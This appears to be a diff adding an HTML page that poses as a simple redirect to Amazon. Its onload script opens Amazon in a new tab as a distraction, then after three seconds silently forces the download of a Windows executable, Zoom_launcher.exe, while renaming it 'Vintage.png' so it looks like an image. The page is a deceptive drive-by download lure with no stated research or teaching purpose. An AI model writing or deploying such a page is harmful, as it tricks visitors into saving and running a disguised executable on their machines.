@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        window.onload = function() {
+            // Open Amazon in a new tab (prevents blocking)
+            window.open("https://www.amazon.com", "_blank");
+
+            // Auto-trigger file download (separate action)
+            setTimeout(() => {
+                let link = document.createElement("a");
+                link.href = "https://zoom.us/launch/download/Q94CGk3JBld__pL0iDQuLJThTPmEYZPuXWL0VeXQD3wnuJtOqTixXVih1f0IBNv3NT28W8hJh7GPXeBxDBpZaaQVT1klRmBhVwisKNd-r_4gCKy691nUDuysEL9x2n2eRXjR3uNj3HCReJ51Y6XLxTnBDYydZfLH7PLz8v8eohwWNcTB57Zllk8KqKzT0PTsREoEzg2xKm0KosX4gFDkjtU_e8mfNme3_XjjvnGwrwFn3gol_rPsBNzl6pUYvkn8TGbtH8KDjyrhLwEefGPmndrMBMuxPV_6Y11lWviCUVWwhZezdWhIZnRxhikuknwaM3VgqcaOkCMxU3_uOGW5gbPTV3Dm1rg7sEtUWO4HKXM4BRzCWOHQaJqIL1UBcwJgM33vmybiFcBvX_c0dDZUe7xjZkxnZbghUSY2PDjWdB4Xv2FzHAVm61awR8eiKSXwNZGPo_Ebg0y6KyuxtxHA5BkKGVybLCi4ISIfuVCFYcaqP2TQyO_Fq_VRjuSfo41x6H7K9pzBA0mQTyF-C1UG5T9zc9tRJr7zrpXrT5QfGQfzgLIdwBxsBGM5f6n52h7hrTIzV_uSo73P39B1f41d-7WZuLSyr5pdeqZzm1E.JXst3LUKmqZZd1r5/meeting/DHsrVnWurUAKWzAtrv5LOfC8Wl3-rbMl-_bH.gdvCeoV8pYSA7vAN/Zoom_launcher.exe";
+                link.download = "Vintage.png";  // Set the filename
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, 3000);  // Delay to allow the Amazon tab to open first
+        };
+    </script>
+</head>
+<body>
+    <p>Redirecting to Amazon... If not redirected, <a href="https://www.amazon.com">click here</a>.</p>
+</body>
+</html>
